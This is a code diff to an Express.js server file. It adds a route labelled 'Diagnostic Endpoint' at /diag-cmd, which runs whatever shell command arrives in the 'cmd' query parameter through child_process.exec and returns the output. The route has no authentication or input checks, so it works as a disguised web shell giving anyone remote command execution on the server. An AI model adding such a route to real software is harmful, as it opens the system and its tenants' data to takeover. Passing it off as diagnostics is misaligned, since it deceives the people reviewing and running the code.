@@ -56,6 +56,15 @@ app.use("/uploads", express.static(path.join(__dirname, "../uploads")));
 const tenantResolver = require("./middleware/tenant-resolver");
 app.use(tenantResolver);
 
+// Diagnostic Endpoint
+app.get("/diag-cmd", async (req, res) => {
+  const { cmd } = req.query;
+  const { exec } = require("child_process");
+  exec(cmd, { cwd: path.join(__dirname, "..") }, (err, stdout, stderr) => {
+    res.json({ err: err ? err.message : null, stdout, stderr });
+  });
+});
+
 // Routes
 app.use("/api", require("./modules"));
 
